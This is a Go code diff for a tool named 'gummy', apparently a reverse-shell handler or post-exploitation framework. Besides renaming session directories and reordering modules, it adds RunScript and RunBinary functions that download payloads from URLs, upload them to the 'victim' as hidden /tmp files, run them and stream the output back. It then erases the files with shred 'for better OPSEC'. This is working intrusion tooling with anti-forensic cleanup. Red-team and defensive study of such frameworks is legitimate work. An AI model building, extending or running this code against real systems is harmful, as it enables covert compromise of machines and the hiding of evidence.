@@ -47,11 +47,11 @@ type SessionInfo struct {
 }
 
 // Directory retorna o diretório base da sessão
-// Formato: ~/.gummy/YYYY_MM_DD/ID_IP_user_hostname/
+// Formato: ~/.gummy/YYYY_MM_DD/IP_user_hostname/
 func (s *SessionInfo) Directory() string {
 	date := s.CreatedAt.Format("2006_01_02")
 	whoami := sanitizePath(s.Whoami)
-	dirname := fmt.Sprintf("%d_%s_%s", s.NumID, s.RemoteIP, whoami)
+	dirname := fmt.Sprintf("%s_%s", s.RemoteIP, whoami)
 
 	home, _ := os.UserHomeDir()
 	return filepath.Join(home, ".gummy", date, dirname)
@@ -89,8 +89,151 @@ func sanitizePath(s string) string {
 	return replacer.Replace(s)
 }
 
+// RunScript downloads (if URL), uploads to victim, executes, streams output
+// Simple approach that actually works with clean output
+func (s *SessionInfo) RunScript(scriptSource string, args []string) error {
+	timestamp := time.Now().Format("2006_01_02-15_04_05")
+
+	// Download if URL
+	var scriptPath string
+	if strings.HasPrefix(scriptSource, "http://") || strings.HasPrefix(scriptSource, "https://") {
+		scriptPath = filepath.Join(s.ScriptsDir(), timestamp+"-"+filepath.Base(scriptSource))
+		if err := DownloadFile(scriptSource, scriptPath); err != nil {
+			return fmt.Errorf("download failed: %w", err)
+		}
+	} else {
+		scriptPath = scriptSource
+	}
+
+	// Output file
+	outputPath := filepath.Join(s.ScriptsDir(), timestamp+"-output.txt")
+
+	// Create empty output file for tail -f
+	if err := os.WriteFile(outputPath, []byte{}, 0644); err != nil {
+		return fmt.Errorf("failed to create output file: %w", err)
+	}
+
+	// Open terminal
+	tailCmd := fmt.Sprintf("tail -f %s", outputPath)
+
+	if err := OpenTerminal(tailCmd); err != nil {
+		fmt.Println(ui.Warning(fmt.Sprintf("Could not open terminal: %v", err)))
+	}
+
+	time.Sleep(300 * time.Millisecond)
+
+	// Upload script
+	remotePath := fmt.Sprintf("/tmp/.gummy_%d", time.Now().UnixNano())
+	t := NewTransferer(s.Conn, s.ID)
+	if err := t.Upload(context.Background(), scriptPath, remotePath); err != nil {
+		return fmt.Errorf("upload failed: %w", err)
+	}
+
+	// Build args
+	argsStr := ""
+	if len(args) > 0 {
+		argsStr = " " + strings.Join(args, " ")
+	}
+
+	// Show execution message with output path
+	fmt.Println(ui.Info(fmt.Sprintf("Executing script and saving output to: %s", outputPath)))
+
+	go func() {
+		// Small delay to ensure upload markers are processed
+		time.Sleep(200 * time.Millisecond)
+
+		cmd := fmt.Sprintf("bash %s%s", remotePath, argsStr)
+		if err := s.Handler.ExecuteWithStreaming(cmd, outputPath); err != nil {
+			fmt.Println(ui.Error(fmt.Sprintf("Execution error: %v", err)))
+			return
+		}
+
+		// Cleanup (shred if available for better OPSEC, otherwise rm)
+		s.Handler.SendCommand(fmt.Sprintf("shred -uz %s 2>/dev/null || rm -f %s\n", remotePath, remotePath))
+	}()
+
+	return nil
+}
+
+// RunBinary downloads (if URL), uploads to victim, makes executable, runs
+// Same as RunScript but for binary executables (no bash interpreter)
+func (s *SessionInfo) RunBinary(binarySource string, args []string) error {
+	timestamp := time.Now().Format("2006_01_02-15_04_05")
+
+	// Download if URL
+	var binaryPath string
+	if strings.HasPrefix(binarySource, "http://") || strings.HasPrefix(binarySource, "https://") {
+		binaryPath = filepath.Join(s.ScriptsDir(), timestamp+"-"+filepath.Base(binarySource))
+		if err := DownloadFile(binarySource, binaryPath); err != nil {
+			return fmt.Errorf("download failed: %w", err)
+		}
+	} else {
+		binaryPath = binarySource
+	}
+
+	// Output file
+	outputPath := filepath.Join(s.ScriptsDir(), timestamp+"-output.txt")
+
+	// Create empty output file for tail -f
+	if err := os.WriteFile(outputPath, []byte{}, 0644); err != nil {
+		return fmt.Errorf("failed to create output file: %w", err)
+	}
+
+	// Open terminal
+	tailCmd := fmt.Sprintf("tail -f %s", outputPath)
+
+	if err := OpenTerminal(tailCmd); err != nil {
+		fmt.Println(ui.Warning(fmt.Sprintf("Could not open terminal: %v", err)))
+	}
+
+	time.Sleep(300 * time.Millisecond)
+
+	// Upload binary
+	remotePath := fmt.Sprintf("/tmp/.gummy_%d", time.Now().UnixNano())
+	t := NewTransferer(s.Conn, s.ID)
+	if err := t.Upload(context.Background(), binaryPath, remotePath); err != nil {
+		return fmt.Errorf("upload failed: %w", err)
+	}
+
+	// Build args
+	argsStr := ""
+	if len(args) > 0 {
+		argsStr = " " + strings.Join(args, " ")
+	}
+
+	// Show execution message with output path
+	fmt.Println(ui.Info(fmt.Sprintf("Executing binary and saving output to: %s", outputPath)))
+
+	go func() {
+		// Small delay to ensure upload markers are processed
+		time.Sleep(200 * time.Millisecond)
+
+		// For long-running binaries: timeout 5m, run in background, redirect output
+		// This allows the command to return immediately while binary runs
+		remoteOutput := remotePath + ".out"
+		cmd := fmt.Sprintf("chmod +x %s && timeout 5m %s%s > %s 2>&1 &",
+			remotePath, remotePath, argsStr, remoteOutput)
+
+		// Send command (returns immediately since it's backgrounded)
+		s.Handler.SendCommand(cmd + "\n")
+		time.Sleep(500 * time.Millisecond)
+
+		// Tail the output file on remote (this streams to our local file)
+		tailCmd := fmt.Sprintf("timeout 5m tail -f %s 2>/dev/null", remoteOutput)
+		if err := s.Handler.ExecuteWithStreaming(tailCmd, outputPath); err != nil {
+			// Timeout is expected, not an error
+		}
+
+		// Cleanup both binary and output file
+		s.Handler.SendCommand(fmt.Sprintf("shred -uz %s %s 2>/dev/null || rm -f %s %s\n",
+			remotePath, remoteOutput, remotePath, remoteOutput))
+	}()
+
+	return nil
+}
+
 // GummyCompleter implements readline.AutoCompleter for smart path completion
-type GummyCompleter struct {
+type GummyCompleter struct{
 	manager *Manager
 }
 
@@ -350,10 +493,6 @@ func (m *Manager) AddSession(id string, conn net.Conn, remoteIP string) {
 	m.sessions[id] = session
 	m.nextID++
 
-	// Create session directory structure
-	session.ScriptsDir()
-	session.LogsDir()
-
 	// Detecta whoami e platform em background
 	go m.detectSessionInfo(session)
 
@@ -527,15 +666,15 @@ func (m *Manager) handleModulesList() {
 
 	var lines []string
 
-	// Sort categories for consistent display
-	var catNames []string
-	for cat := range categories {
-		catNames = append(catNames, cat)
-	}
-	sort.Strings(catNames)
+	// Explicit category order (Linux, Windows, Misc, Custom)
+	categoryOrder := []string{"Linux", "Windows", "Misc", "Custom"}
 
 	// Build module list grouped by category
-	for _, cat := range catNames {
+	for _, cat := range categoryOrder {
+		// Skip if category has no modules
+		if len(categories[cat]) == 0 {
+			continue
+		}
 		lines = append(lines, ui.CommandHelp(cat))
 		for _, mod := range categories[cat] {
 			line := fmt.Sprintf("%-15s - %s", mod.Name(), mod.Description())
